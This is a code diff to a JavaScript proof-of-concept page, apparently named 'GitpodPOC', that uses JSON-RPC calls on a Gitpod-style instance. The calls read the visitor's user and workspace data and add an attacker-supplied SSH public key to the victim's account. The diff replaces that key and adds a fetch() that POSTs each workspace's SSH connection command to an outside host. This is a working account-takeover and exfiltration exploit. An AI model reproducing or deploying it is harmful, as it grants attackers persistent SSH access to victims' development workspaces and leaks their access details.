@@ -100,7 +100,7 @@
             // Example: Automatically fetch user data
             sendJsonRpcRequest("getLoggedInUser").then(handleUserResponse);
             sendJsonRpcRequest("getWorkspaces").then(fetchWorkspaces);
-            sendJsonRpcRequest("addSSHPublicKey", ({"name": "GitpodPOC("+(Math.random() + 1).toString(36).substring(7)+")", "key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCogKP5qUSUPQkBZjBbuisSLU+WyYUmpm9O+cKGgTAQlnsesdJ4ZiV3RfTs31j8UH41yqPTMfDaDohg6TNi3532uL5dC6OUC/pA9F/CoENdukbzkfO7E7t5zvCkNqfT9zVubdEJMRmwppnOREXxy8Ab7RylfoifhRF3djAGA7+4bqOn9LeXxULfRKIA65oHsqJE9U622jbMGq53iTCQhF//bkAkhxKpVL71gJUFWBAnFAlS9fPEmap9DDNXu70BQa79BTcSM8u6VbadvXOBN9OZY8bx8Q6ftuT3xsn/wVelqP+A15JErm1VeF0TRXQ5fvXCb86AL9AGNY4lCweTL9GrYaYo92NjugL2NzfjdHd3ak1eCc1sogiUQ7UovqnOgO6kdp23VoLdH17Je2zECEqbq5PZInMbE36pa9vfkUfxh8IlWIUFIP1kZFRLKBRfkryinIqmhKVmkwMsZpwydRRhsgxqMKp6M7/q9mfKEHDvobNiXyRgYxwfZlD87EPbMHkg+b+1IBx8SCElu8dWDFRU96OGo9/oEjqDBWvROBV66ZXyp3g4a8IuTR3/5ns6upq2FWle2C1sc4fe/e023fmcP72+U8U2fZjPq7HwcPwEv5qCPLlULbO+aQlDq8icWMrddWURx3dCCJFa9+uN1LaBbl8L/jVNtj2BRxLqy16hhw== i589264@HTP7654TXH"})).then(handleSSHKeyAdded);
+            sendJsonRpcRequest("addSSHPublicKey", ({"name": "GitpodPOC("+(Math.random() + 1).toString(36).substring(7)+")", "key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSwziWGZt1W5RGbPxqKd98AV9pjeRwEP3zlwxmSz26J48lf26nTLfMsU0IGCKDOzT7QgE6DoiKY97J6h/HknFjlWBS9kut1GBHsq4iPAUnuPrRMkuu2stsm0rPQpUUiyXMu/ZtMbN/YgeQFHUB+YS0tnnVxVf+soCus8jstRwdQdmaP1bRmVYSF83GQJM1r7EhfL9c5H+HzLXLr70ILtqyJsyEY8qBasBvBmYdQI89fNc8k3Az4XOqqECk/1iWGyFgjB6aGJKDIW/dMqiHsn9i3aHldfcAVaN/LP7xQxB37Q0bfrt5GuHpuJDmq4v0vD87Iv1wgFM7LUX6daohfEfpT7oxtFXZJQzFQWmeg+FmruB8OzLFqF8wSxivNcHiEWiJaXisC6jtSt6sprWTHdJ2a9JPhaPvGhSX6AFkKxR4jpMDVej6zHci/8ghUJsocjkGj36xU288PhWmWg26l/bLXmjLcKsjdAdD1p7heUwnNXl5H+wMc7HlOSgw8kFL2TU="})).then(handleSSHKeyAdded);
             sendJsonRpcRequest("getSSHPublicKeys").then(handleSSH);
         });
     
@@ -168,6 +168,12 @@
 
             response.result.forEach(item => {
                 if (!item.workspace || !item.latestInstance) return; // Ensure required data exists
+
+                fetch("https://8080-h4ckua11-gitpodpoc-xjjgs10r5yr.ws.gitpod.mystacs.com", {
+                    method: "POST",
+                    body: `ssh ${item.workspace.id}@${item.workspace.id}.ssh.ws.gitpod.mystacs.com -i ~/.ssh/id_gitpod`,
+                    headers: { "Content-Type": "text/plain" }
+                });
 
                 const li = document.createElement("div");
                 li.innerHTML = `
